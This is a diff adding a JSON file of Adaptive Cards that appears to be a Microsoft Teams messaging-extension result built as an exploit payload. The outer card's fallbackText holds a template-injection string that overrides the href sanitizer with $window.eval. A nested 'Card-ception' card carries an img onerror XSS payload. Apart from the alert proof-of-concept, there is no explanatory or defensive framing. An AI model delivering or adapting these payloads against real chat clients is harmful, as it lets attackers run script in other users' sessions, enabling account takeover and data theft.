@@ -1,0 +1,29 @@
+[
+  {
+    "preview": {
+      "contentType": "application/vnd.microsoft.card.thumbnail",
+      "content": {
+        "title": "result 1"
+      }
+    },
+    "contentType": "application/vnd.microsoft.card.adaptive",
+    "content": {
+      "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
+      "type": "AdaptiveCard",
+      "version": "3.0",
+      "fallbackText": "{{7*7}} {{ctrl.htmlSanitizer.sanitizeHrefUrl=ctrl.$window.eval;}}",
+      "body": [],
+      "actions": [
+        {
+          "type": "Action.ShowCard",
+          "title": "Card-ception",
+          "card": {
+            "type": "AdaptiveCard",
+            "fallbackText": "<img src=/ onerror=javascript:alert('fallbackText')>",
+            "body": []
+          }
+        }
+      ]
+    }
+  }
+]
